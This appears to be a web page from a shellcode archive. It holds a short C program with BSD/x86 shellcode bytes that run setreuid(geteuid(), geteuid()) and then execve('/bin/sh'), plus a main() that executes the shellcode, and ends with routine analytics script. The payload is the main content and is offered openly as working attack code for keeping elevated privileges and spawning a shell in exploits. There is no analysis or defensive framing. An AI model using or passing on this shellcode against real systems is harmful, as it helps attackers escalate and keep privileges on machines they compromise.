<html><head><title>BSD/x86 - setreuid(geteuid(), geteuid()) and execve(/bin/sh, /bin/sh, 0)</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * bsd/x86 setreuid/exec shellcode
 *
 * setreuid(geteuid(), geteuid()) and execve(&quot;/bin/sh&quot;, &quot;/bin/sh&quot;, 0) 
 * shellcode based on hkpco's setreuid/exec shellcode for linux
 * Tested on FreeBSD
*/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

char shellcode[] =
 &quot;\x31\xc0\xb0\x19\x50\xcd\x80\x50&quot;
 &quot;\x50\x31\xc0\xb0\x7e\x50\xcd\x80&quot; // setreuid(geteuid(), getuid());
 &quot;\xeb\x0d\x5f\x31\xc0\x50\x89\xe2&quot;
 &quot;\x52\x57\x54\xb0\x3b\xcd\x80\xe8&quot;
 &quot;\xee\xff\xff\xff/bin/sh&quot;; // exec(/bin/sh)

int main()
{
int (*f)() = (int (*)())shellcode;
 printf(&quot;%d\n&quot;,strlen(shellcode));
f();
 return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
